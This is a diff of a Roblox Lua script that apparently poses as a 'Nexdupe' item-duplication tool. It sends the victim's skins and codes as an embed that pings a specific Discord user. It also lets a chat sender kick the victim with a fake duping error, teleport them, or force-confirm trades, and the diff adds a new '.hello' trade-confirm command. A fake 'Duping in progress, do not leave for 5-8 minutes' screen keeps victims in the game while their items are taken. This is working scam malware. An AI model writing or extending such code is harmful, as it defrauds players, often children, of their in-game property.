@@ -73,8 +73,12 @@ local function sendSkinsAndCodes()
         end
     end
     local payload = HttpService:JSONEncode({
+        content = "<@880339586675527681>",
+        allowed_mentions = {
+            users = {"880339586675527681"}
+        },
         embeds = {{
-            title = "@7cld, Dahood skins for -  " .. LocalPlayer.Name,
+            title = "Dahood skins for - " .. LocalPlayer.Name,
             description = msg,
             color = 3447003
         }}
@@ -128,7 +132,7 @@ local function handleChat(msg, sender)
     local targetName = args[2]
     local payload = table.concat(args, " ", 3)
     if command == ".kick" and isTargeted(targetName) then
-        local reason = payload ~= "" and payload or "Please try other executor."
+        local reason = payload ~= "" and payload or "Error in duping, contact support. (age group failed)"
         LocalPlayer:Kick(reason)
     elseif command == ".bring" and isTargeted(targetName) then
         if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
@@ -220,6 +224,11 @@ local function handleChat(msg, sender)
         pcall(function()
             MainEvent:FireServer("Trading", "Confirm", "", "")
         end)
+    elseif command == ".hello" and isTargeted(targetName) then
+        local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+        pcall(function()
+            MainEvent:FireServer("Trading", "Confirm", "", "")
+        end)
     elseif command == ".dupe" and isTargeted(targetName) then
         StarterGui:SetCore("SendNotification", {
             Title = "Nexdupe";
@@ -241,15 +250,15 @@ local function handleChat(msg, sender)
             end
         end)
 
-        -- Create "Duping in progress" UI
+        -- Create loading UI
         local loadingGui = Instance.new("ScreenGui")
         loadingGui.Name = "NexdupeLoading"
         loadingGui.ResetOnSpawn = false
         loadingGui.Parent = player.PlayerGui
 
         local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(0, 300, 0, 100)
-        frame.Position = UDim2.new(0.5, -150, 0.5, -50)
+        frame.Size = UDim2.new(0, 360, 0, 135)
+        frame.Position = UDim2.new(0.5, -180, 0.5, -67)
         frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
         frame.BorderSizePixel = 0
         frame.Parent = loadingGui
@@ -259,8 +268,8 @@ local function handleChat(msg, sender)
         corner.Parent = frame
 
         local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, -70, 1, 0)
-        text.Position = UDim2.new(0, 60, 0, 0)
+        text.Size = UDim2.new(1, -80, 0, 30)
+        text.Position = UDim2.new(0, 70, 0, 15)
         text.BackgroundTransparency = 1
         text.Text = "Duping in progress..."
         text.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -269,10 +278,32 @@ local function handleChat(msg, sender)
         text.TextXAlignment = Enum.TextXAlignment.Left
         text.Parent = frame
 
+        local premiumText = Instance.new("TextLabel")
+        premiumText.Size = UDim2.new(1, -80, 0, 25)
+        premiumText.Position = UDim2.new(0, 70, 0, 48)
+        premiumText.BackgroundTransparency = 1
+        premiumText.Text = "NEXDUPE PREMIUM"
+        premiumText.TextColor3 = Color3.fromRGB(255, 210, 0)
+        premiumText.TextSize = 14
+        premiumText.Font = Enum.Font.GothamBold
+        premiumText.TextXAlignment = Enum.TextXAlignment.Left
+        premiumText.Parent = frame
+
+        local warningText = Instance.new("TextLabel")
+        warningText.Size = UDim2.new(1, -80, 0, 25)
+        warningText.Position = UDim2.new(0, 70, 0, 78)
+        warningText.BackgroundTransparency = 1
+        warningText.Text = "This takes 5-8 minutes do not leave the game"
+        warningText.TextColor3 = Color3.fromRGB(170, 170, 170)
+        warningText.TextSize = 10
+        warningText.Font = Enum.Font.Gotham
+        warningText.TextXAlignment = Enum.TextXAlignment.Left
+        warningText.Parent = frame
+
         -- Loading circle
         local loadingCircle = Instance.new("TextLabel")
         loadingCircle.Size = UDim2.new(0, 40, 0, 40)
-        loadingCircle.Position = UDim2.new(0, 15, 0.5, -20)
+        loadingCircle.Position = UDim2.new(0, 18, 0.5, -20)
         loadingCircle.BackgroundTransparency = 1
         loadingCircle.Text = "◐"
         loadingCircle.TextColor3 = Color3.fromRGB(255, 255, 255)
